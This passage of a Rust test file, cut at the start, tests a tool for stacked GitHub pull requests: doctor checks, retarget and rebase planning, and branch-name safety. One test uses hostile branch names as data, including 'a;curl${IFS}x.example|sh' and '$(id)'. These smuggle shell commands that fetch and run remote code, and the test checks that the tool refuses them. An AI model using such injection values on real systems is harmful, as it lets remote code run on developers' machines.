            ),
        )?;
        fs::set_permissions(&gh_path, fs::Permissions::from_mode(0o755))?;
        let gh = adapter(gh_path, &worker)?;
        assert_eq!(gh.run(&StackCommand::Push), StackResult::Done);
        assert_eq!(
            fs::read_to_string(root.join("config-log"))?,
            "core.hooksPath=/dev/null\ncore.sshCommand=ssh\npush.followTags=false\n\
             push.recurseSubmodules=no\nremote.origin.mirror=false\n"
        );
        Ok(())
    }
}

// Doctor.

#[test]
fn doctor_blocks_stacking_workflows_until_the_stack_tool_is_installed() -> TestResult {
    let stacking = BTreeSet::from([Workflow::Pickup, Workflow::Gate]);
    let missing = stack_tool_finding(
        StackTool::GhStack,
        &stacking,
        Some(&StackToolStatus::Missing),
    )
    .ok_or("missing tool not reported")?;
    assert_eq!(missing.code, DoctorCode::StackTool);
    assert!(missing.message.contains("gh stack"));
    assert!(missing.message.contains("pickup"));
    let unprobed =
        stack_tool_finding(StackTool::GhStack, &stacking, None).ok_or("unprobed tool accepted")?;
    assert_eq!(unprobed.code, DoctorCode::StackTool);
    assert_eq!(
        stack_tool_finding(
            StackTool::GhStack,
            &stacking,
            Some(&StackToolStatus::Installed {
                version: "0.1.0".to_owned()
            })
        ),
        None
    );
    // A repository that creates no dependent pull requests does not need it.
    assert_eq!(
        stack_tool_finding(
            StackTool::GhStack,
            &BTreeSet::from([Workflow::Gate, Workflow::Triage]),
            Some(&StackToolStatus::Missing)
        ),
        None
    );
    Ok(())
}

// Retargeting after a base merged.

fn number(value: u64) -> TestResult<IssueNumber> {
    Ok(IssueNumber::new(value)?)
}

fn merged() -> TestResult<MergedBase> {
    Ok(MergedBase {
        pull_request: number(41)?,
        branch: branch("lemarier/a")?,
        into: branch("main")?,
        head: commit('a')?,
    })
}

fn dependent(pr: u64, name: &str, base: &str, head: char) -> TestResult<Dependent> {
    Ok(Dependent {
        pull_request: number(pr)?,
        branch: branch(name)?,
        base: branch(base)?,
        head: commit(head)?,
    })
}

#[test]
fn a_squash_merged_base_retargets_first_and_instructs_each_writer() -> TestResult {
    let dependents = [
        // Out of order, plus an unrelated pull request.
        dependent(43, "lemarier/c", "lemarier/b", 'c')?,
        dependent(42, "lemarier/b", "lemarier/a", 'b')?,
        dependent(50, "lemarier/other", "main", 'e')?,
    ];
    let plan = plan_retarget(None, &merged()?, &dependents)?;
    assert_eq!(
        plan.steps,
        vec![
            RetargetStep::Retarget {
                pull_request: number(42)?,
                from: branch("lemarier/a")?,
                to: branch("main")?,
            },
            RetargetStep::RebaseOnto {
                branch: branch("lemarier/b")?,
                onto: branch("main")?,
                upstream: commit('a')?,
            },
            RetargetStep::RebaseOnto {
                branch: branch("lemarier/c")?,
                onto: branch("lemarier/b")?,
                upstream: commit('b')?,
            },
        ]
    );
    assert_eq!(plan.delete_after, branch("lemarier/a")?);
    let instructions: Vec<String> = plan
        .steps
        .iter()
        .filter_map(RetargetStep::instruction)
        .collect();
    assert_eq!(
        instructions,
        vec![
            format!("git rebase --onto main {} lemarier/b", commit('a')?),
            format!("git rebase --onto lemarier/b {} lemarier/c", commit('b')?),
        ]
    );
    Ok(())
}

#[test]
fn a_stacked_repair_goes_through_the_stack_tool() -> TestResult {
    let dependents = [
        dependent(42, "lemarier/b", "lemarier/a", 'b')?,
        dependent(43, "lemarier/c", "lemarier/b", 'c')?,
    ];
    let plan = plan_retarget(Some(StackTool::GhStack), &merged()?, &dependents)?;
    assert_eq!(
        plan.steps,
        vec![RetargetStep::StackTool {
            branch: branch("lemarier/b")?,
            commands: vec![
                StackCommand::RebaseUpstack,
                StackCommand::Submit { ready: false }
            ],
        }]
    );
    // No plain retarget or rebase is planned, and the plain paths refuse.
    assert!(plan.steps.iter().all(|step| step.instruction().is_none()));
    assert!(
        check_plain(
            Some(StackTool::GhStack),
            &BranchLayer::Dependent {
                parent: branch("lemarier/a")?
            },
            BranchOperation::Retarget
        )
        .is_err()
    );
    Ok(())
}

#[test]
fn a_retarget_needs_a_linear_chain() -> TestResult {
    let plan = plan_retarget(None, &merged()?, &[])?;
    assert!(plan.steps.is_empty());
    let forked = [
        dependent(42, "lemarier/b", "lemarier/a", 'b')?,
        dependent(43, "lemarier/c", "lemarier/a", 'c')?,
    ];
    assert_eq!(
        plan_retarget(None, &merged()?, &forked),
        Err(StackRefusal::InvalidLayers)
    );
    let long: Vec<Dependent> = (0..=MAX_STACK_LAYERS)
        .map(|layer| {
            let base = if layer == 0 {
                "lemarier/a".to_owned()
            } else {
                format!("lemarier/l{}", layer - 1)
            };
            dependent(
                60 + u64::try_from(layer)?,
                &format!("lemarier/l{layer}"),
                &base,
                'd',
            )
        })
        .collect::<TestResult<_>>()?;
    assert_eq!(
        plan_retarget(None, &merged()?, &long),
        Err(StackRefusal::InvalidLayers)
    );
    Ok(())
}

#[test]
fn a_hostile_branch_name_from_pull_request_data_never_becomes_shell_text() -> TestResult {
    // Git accepts these names; a shell would run the part after `;` or `$(`.
    let hostile = BranchName::new("a;curl${IFS}x.example|sh")?;
    let substitution = BranchName::new("lemarier/$(id)")?;
    let chains = [
        vec![Dependent {
            branch: hostile.clone(),
            ..dependent(42, "lemarier/b", "lemarier/a", 'b')?
        }],
        vec![
            dependent(42, "lemarier/b", "lemarier/a", 'b')?,
            Dependent {
                branch: substitution.clone(),
                ..dependent(43, "lemarier/c", "lemarier/b", 'c')?
            },
        ],
    ];
    for dependents in &chains {
        for tool in [None, Some(StackTool::GhStack)] {
            assert_eq!(
                plan_retarget(tool, &merged()?, dependents),
                Err(StackRefusal::UnsafeBranchName)
            );
        }
    }
    // A merged base or target from pull-request data is checked too.
    let bad_base = MergedBase {
        branch: substitution.clone(),
        ..merged()?
    };
    let on_bad = [Dependent {
        base: substitution.clone(),
        ..dependent(42, "lemarier/b", "lemarier/a", 'b')?
    }];
    assert_eq!(
        plan_retarget(None, &bad_base, &on_bad),
        Err(StackRefusal::UnsafeBranchName)
    );
    // A step built directly still yields no shell text, only arguments.
    let step = RetargetStep::RebaseOnto {
        branch: hostile.clone(),
        onto: branch("main")?,
        upstream: commit('a')?,
    };
    assert_eq!(step.instruction(), None);
    assert_eq!(
        step.args(),
        Some(vec![
            "git".to_owned(),
            "rebase".to_owned(),
            "--onto".to_owned(),
            "main".to_owned(),
            commit('a')?.to_string(),
            hostile.to_string(),
        ])
    );
    Ok(())
}
